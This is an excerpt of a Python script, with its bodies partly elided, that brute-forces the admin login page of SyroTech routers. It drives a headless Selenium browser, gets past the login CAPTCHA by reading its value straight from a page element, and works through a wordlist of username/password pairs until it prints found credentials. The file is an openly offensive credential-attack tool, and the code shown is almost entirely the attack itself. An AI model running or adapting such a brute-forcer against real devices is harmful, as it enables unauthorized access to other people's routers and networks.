...
class BruteForce(object):
    ...
    def __init__(self, bin, V):
        if not bin:
            ...
            if not V:options.add_argument('headless')
    ...
    def solve_cap(self):
        try:return self.browser.find_element_by_id("check_code").get_attribute("value")
        except:
            try:
            ...
            except:print("Either the site is not responding or does not exist");exit()
...
def main():
    parser = argparse.ArgumentParser(description='BruteForce SyroTech admin page', epilog='By AlenPaulVarghese', prog="SyroTech-AdminPage-BruteForcer")
    ...
    if not os.path.isfile(options.list):
        print(f"File not found --> {options.list}");return
    ...
    for x,y in BruteForce.wordlist_parser(options.list):
        ...
        cap = brute.solve_cap();print(f"Trying {x}/{y} [?]", end=" - ")
        brute.fill_forms(x, y, cap)
        if brute.is_error():print("X")
        else:print(f"Found Credentials : {x}/{y} [✔]");break
